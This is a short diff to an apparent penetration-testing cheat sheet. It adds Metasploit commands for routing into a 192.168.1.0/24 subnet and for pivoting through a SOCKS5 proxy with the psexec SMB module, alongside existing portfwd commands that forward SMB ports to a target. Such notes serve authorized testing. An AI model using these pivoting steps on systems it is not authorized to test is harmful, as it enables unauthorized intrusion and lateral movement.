@@ -90,3 +90,18 @@ use auxiliary/server/socks_proxy
 Portfwd add -L 127.0.0.1 -l 445 -p 445 -r targetIP
 portfwd add -L 127.0.0.1 -l 139 -p 139 -r targetIP
 ```
+
+### route in metasploit
+
+```
+route add 192.168.1.0 255.255.255.0 1
+```
+
+### reverse proxy using msf and pivoting using psexec
+
+```
+server/socks5
+set proxies socks5://127.0.0.1:1080
+set ReverseAllowProxy true
+windows/smb/psexec
+```
